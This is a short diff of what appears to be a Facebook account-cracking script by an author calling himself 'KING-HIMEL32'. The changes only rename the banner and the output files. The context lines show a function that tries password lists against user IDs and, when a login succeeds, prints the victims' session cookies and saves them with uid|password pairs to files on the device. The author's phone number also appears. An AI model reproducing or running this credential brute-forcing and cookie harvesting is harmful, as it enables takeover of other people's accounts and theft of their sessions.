@@ -169,7 +169,7 @@ logo=("""\033[1;94m
    \033[1;91m          Hard Woark kye to sucees(KING-HIMEL32)
   \033[1;92;1m                      
                                     ## HIMEL-HACKER##
-  \033[1;31m====================================================
+  \033[1;31m==================================================
   [∆]\033[1;96;1m Author   :KING-HIMEL32
   [∆]\033[1;93;1m Facebook :mdnx.himel32
   [∆]\033[1;94;1m Whatsapp : 01601161609
@@ -392,8 +392,8 @@ def fking1(ids,passlist):
                                         print("")
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
-                                        open('/sdcard/F-JOYA-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/F-JOYA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/HIMEL-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/HIMEL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
